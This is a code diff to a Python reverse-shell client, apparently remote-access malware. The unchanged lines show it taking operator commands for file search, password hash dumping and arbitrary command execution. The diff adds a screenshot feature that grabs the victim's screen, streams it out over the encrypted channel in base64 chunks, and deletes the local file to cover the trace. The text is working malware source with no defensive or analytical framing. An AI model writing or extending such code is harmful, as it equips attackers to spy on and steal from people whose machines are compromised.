@@ -4,7 +4,7 @@ import os
 import sys
 from aes_crypt import AESCipher
 from time import sleep
-from base64 import b64encode, b64decode
+from base64 import b64encode
 from PIL import ImageGrab
 import platform
 import datetime
@@ -53,6 +53,8 @@ class ReverseShellClient:
                     self.handle_search(decrypted_data)
                 elif decrypted_data.startswith("hashdump"):
                     self.handle_hashdump()
+                elif decrypted_data.startswith("screenshot"):
+                    self.handle_screenshot()
                 else:
                     self.execute_command(decrypted_data)
         finally:
@@ -123,6 +125,33 @@ class ReverseShellClient:
             except Exception as e:
                 result = str(e)
         self.send_large_data(result)
+
+    def handle_screenshot(self):
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+            file_name = f"screenshot_{timestamp}.png"
+            screenshot = ImageGrab.grab()
+            screenshot.save(file_name)
+            self.send_file(file_name)
+            os.remove(file_name)  # Clean up the screenshot file after sending
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def send_file(self, file_path):
+        try:
+            with open(file_path, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    self.conn.send(
+                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
+                            "utf-8"
+                        )
+                    )
+            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
+        except Exception as e:
+            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
 
     def execute_command(self, command):
         try:
